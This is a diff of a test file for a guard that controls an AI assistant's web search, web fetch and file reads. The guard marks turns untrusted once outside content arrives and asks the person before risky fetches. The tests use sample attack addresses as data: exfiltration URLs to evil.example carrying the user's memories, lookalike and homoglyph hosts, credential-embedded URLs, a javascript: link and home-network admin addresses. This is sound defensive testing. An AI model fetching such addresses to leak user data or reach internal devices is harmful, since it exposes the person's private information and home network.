@@ -1,7 +1,7 @@
 import { mkdirSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { describe, expect, test } from "vitest";
-import { BAD_SEARCH, BAD_URL, createNativeGuard, NOT_AVAILABLE, NOT_READABLE } from "../src/tools/native-guard.ts";
+import { BAD_CREDENTIALS, BAD_SEARCH, BAD_URL, createNativeGuard, NOT_AVAILABLE, NOT_READABLE } from "../src/tools/native-guard.ts";
 import { UNTRUSTED_REMINDER } from "../src/tools/untrusted.ts";
 import { createTempDir, createTestTurn, KEVIN } from "./helpers.ts";
 
@@ -34,7 +34,6 @@ describe("native guard", () => {
     for (const tool of ["Bash", "Write", "Edit", "Glob", "Grep", "Agent", "NotebookEdit", "mcp__other__x"]) {
       expect(await guard.check(tool, {}, SIGNAL), tool).toEqual({ allow: false, reason: NOT_AVAILABLE });
     }
-    expect(guard.reminder("WebSearch", {})).toBeUndefined();
   });
 
   test("Read: a skill file is allowed and the turn stays trusted", async () => {
@@ -83,11 +82,39 @@ const SEARCH = (query: string) => ({ query });
 const REFUSED_SEARCH = "Recherche non faite : la personne a refusé. Ne réessaie pas sans qu'elle le demande.";
 
 describe("WebSearch", () => {
-  test("trusted turn: searches freely, and the turn stays trusted", async () => {
+  test("trusted turn: searches freely; its results are outside text, so the turn becomes untrusted", async () => {
     const { turn, asked } = createTestTurn(KEVIN, CONV, "refused");
     expect(await createNativeGuard(turn).check("WebSearch", SEARCH("horaires piscine Lyon"), SIGNAL)).toEqual({ allow: true });
     expect(asked).toEqual([]);
-    expect(turn.untrusted).toBe(false);
+    expect(turn.untrusted).toBe(true);
+  });
+
+  test("the result addresses may then be opened without asking; any other address asks", async () => {
+    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused");
+    const guard = createNativeGuard(turn);
+    await guard.check("WebSearch", SEARCH("piscine Lyon"), SIGNAL);
+    const response = {
+      query: "piscine Lyon",
+      results: [
+        "Voici les résultats.",
+        { tool_use_id: "s1", content: [{ title: "Piscines", url: "https://www.lyon.fr/piscines/" }, { title: "x", url: "javascript:alert(1)" }] },
+      ],
+      durationSeconds: 1,
+    };
+    expect(guard.after("WebSearch", SEARCH("piscine Lyon"), response)).toBe(UNTRUSTED_REMINDER);
+    expect(await guard.check("WebFetch", FETCH("https://www.lyon.fr/piscines"), SIGNAL)).toEqual({ allow: true });
+    expect(asked).toEqual([]);
+    expect(await guard.check("WebFetch", FETCH("https://evil.example/"), SIGNAL)).toEqual({ allow: false, reason: REFUSED_FETCH });
+    expect(asked).toHaveLength(1);
+  });
+
+  test("an unexpected search response adds no address, but still reminds", () => {
+    const { turn } = createTestTurn(KEVIN, CONV, "refused");
+    const guard = createNativeGuard(turn);
+    for (const response of [undefined, "texte", { results: "x" }, { results: [{ content: [{ url: 42 }] }] }]) {
+      expect(guard.after("WebSearch", SEARCH("x"), response)).toBe(UNTRUSTED_REMINDER);
+    }
+    expect(turn.untrusted).toBe(true);
   });
 
   test("untrusted turn: the search asks first, showing the query; no → refused", async () => {
@@ -154,16 +181,76 @@ describe("WebFetch", () => {
     const guard = createNativeGuard(turn);
     for (const url of [
       "https://evil.example/?d=souvenirs",
-      // Look-alikes of the person's address: other host, credentials, other query, longer path.
-      "https://meteo.fr@evil.example/paris",
+      // Look-alikes of the person's address: other host, other query, longer path, extra slash.
       "https://meteo.fr.evil.example/paris",
+      "https://meteo.fr/paris//",
       "https://meteo.fr/paris?d=souvenirs",
       "https://meteo.fr/paris/souvenirs",
     ]) {
       expect(await guard.check("WebFetch", FETCH(url), SIGNAL), url).toEqual({ allow: false, reason: REFUSED_FETCH });
     }
-    expect(asked[0]).toEqual({ tool: "WebFetch", summary: expect.stringContaining("https://evil.example/?d=souvenirs") as string });
     expect(asked).toHaveLength(5);
+  });
+
+  test("the card shows the site alone on its own line, then the full address (parsed, never hiding the site)", async () => {
+    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused", { untrusted: true });
+    const guard = createNativeGuard(turn);
+    await guard.check("WebFetch", FETCH("https://аpple.com/\u202Egnp.exe?d=souvenirs"), SIGNAL);
+    await guard.check("WebFetch", FETCH(`https://evil.example/${"a".repeat(600)}`), SIGNAL);
+    const [homoglyph, long] = asked.map((a) => a.summary.split("\n"));
+    expect(homoglyph?.[1]).toBe("xn--pple-43d.com");
+    expect(homoglyph?.[2]).toBe("Adresse complète : https://xn--pple-43d.com/%E2%80%AEgnp.exe?d=souvenirs");
+    expect(long?.[1]).toBe("evil.example");
+    expect(asked[0]?.summary.split("\n")[0]).toBe("Ouvrir une page de ce site ?");
+    for (const a of asked) expect(a.summary.length).toBeLessThanOrEqual(500);
+  });
+
+  test("an address carrying credentials is refused outright", async () => {
+    const { turn, asked } = createTestTurn(KEVIN, CONV, "approved", { userText: "https://meteo.fr@evil.example/paris" });
+    for (const url of ["https://meteo.fr@evil.example/paris", "https://user:pass@example.com/"]) {
+      expect(await createNativeGuard(turn).check("WebFetch", FETCH(url), SIGNAL), url).toEqual({ allow: false, reason: BAD_CREDENTIALS });
+    }
+    expect(asked).toEqual([]);
+  });
+
+  test("a machine of the house always asks, even in a trusted turn and even from the person's message", async () => {
+    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused", { userText: "Regarde http://192.168.1.1/admin" });
+    const guard = createNativeGuard(turn);
+    for (const url of ["http://192.168.1.1/admin", "http://localhost:8780/", "http://[fd00::1]/", "http://homeassistant:8123/", "http://box.local/"]) {
+      expect(await guard.check("WebFetch", FETCH(url), SIGNAL), url).toEqual({ allow: false, reason: REFUSED_FETCH });
+    }
+    expect(asked).toHaveLength(5);
+    expect(asked[0]?.summary.split("\n")[0]).toBe("Ouvrir une adresse du réseau de la maison ?");
+    expect(turn.untrusted).toBe(false);
+  });
+
+  test("a conversation that already let outside content in starts the turn untrusted", async () => {
+    const { turn, asked } = createTestTurn(KEVIN, CONV, "refused", { untrusted: true });
+    expect(turn.untrusted).toBe(true);
+    expect(await createNativeGuard(turn).check("WebFetch", FETCH("https://evil.example/"), SIGNAL)).toEqual({ allow: false, reason: REFUSED_FETCH });
+    expect(asked).toHaveLength(1);
+  });
+
+  test("the question dies with the hook: its signal aborting cancels it", async () => {
+    const { turn } = createTestTurn(KEVIN, CONV, (signal) => new Promise((resolve) => {
+      signal.addEventListener("abort", () => { resolve("cancelled"); }, { once: true });
+    }), { untrusted: true });
+    const hook = new AbortController();
+    const decision = createNativeGuard(turn).check("WebFetch", FETCH("https://evil.example/"), hook.signal);
+    hook.abort();
+    expect(await decision).toEqual({ allow: false, reason: "Page non ouverte : demande de confirmation annulée." });
+  });
+
+  test("a yes that arrives once the turn is over allows nothing", async () => {
+    let end = (): void => undefined;
+    const created = createTestTurn(KEVIN, CONV, () => {
+      end();
+      return Promise.resolve("approved");
+    }, { untrusted: true });
+    end = created.end;
+    const guard = createNativeGuard(created.turn);
+    expect(await guard.check("WebFetch", FETCH("https://evil.example/"), SIGNAL)).toEqual({ allow: false, reason: "Page non ouverte : demande de confirmation annulée." });
+    expect(await guard.check("WebSearch", SEARCH("x"), SIGNAL)).toEqual({ allow: false, reason: "Recherche non faite : demande de confirmation annulée." });
   });
 
   test("untrusted turn: yes → allowed", async () => {
@@ -191,11 +278,24 @@ describe("WebFetch", () => {
     expect(asked).toEqual([]);
   });
 
-  test("reminder after WebFetch and after reading an attachment, not after a skill file", () => {
+  test("reminder after WebFetch, a search and reading an attachment, not after a skill file", () => {
     const { guard, attachmentsDir, skillsDir } = setup();
-    expect(guard.reminder("WebFetch", FETCH("https://example.com"))).toBe(UNTRUSTED_REMINDER);
-    expect(guard.reminder("Read", { file_path: join(attachmentsDir, "a.pdf") })).toBe(UNTRUSTED_REMINDER);
-    expect(guard.reminder("Read", { file_path: join(skillsDir, "lire-un-document", "SKILL.md") })).toBeUndefined();
-    expect(guard.reminder("WebSearch", { query: "x" })).toBeUndefined();
+    expect(guard.after("WebFetch", FETCH("https://example.com"), "page")).toBe(UNTRUSTED_REMINDER);
+    expect(guard.after("Read", { file_path: join(attachmentsDir, "a.pdf") }, "x")).toBe(UNTRUSTED_REMINDER);
+    expect(guard.after("Read", { file_path: join(skillsDir, "lire-un-document", "SKILL.md") }, "x")).toBeUndefined();
+    expect(guard.after("Skill", { skill: "x" }, "x")).toBeUndefined();
+  });
+});
+
+describe("TurnContext", () => {
+  test("the first mark is passed on once (the conversation keeps it); a turn starting untrusted passes nothing", () => {
+    let marks = 0;
+    const { turn } = createTestTurn(KEVIN, CONV, "refused", { onUntrusted: () => { marks++; } });
+    turn.markUntrusted();
+    turn.markUntrusted();
+    expect(marks).toBe(1);
+    const already = createTestTurn(KEVIN, CONV, "refused", { untrusted: true, onUntrusted: () => { marks++; } }).turn;
+    already.markUntrusted();
+    expect(marks).toBe(1);
   });
 });
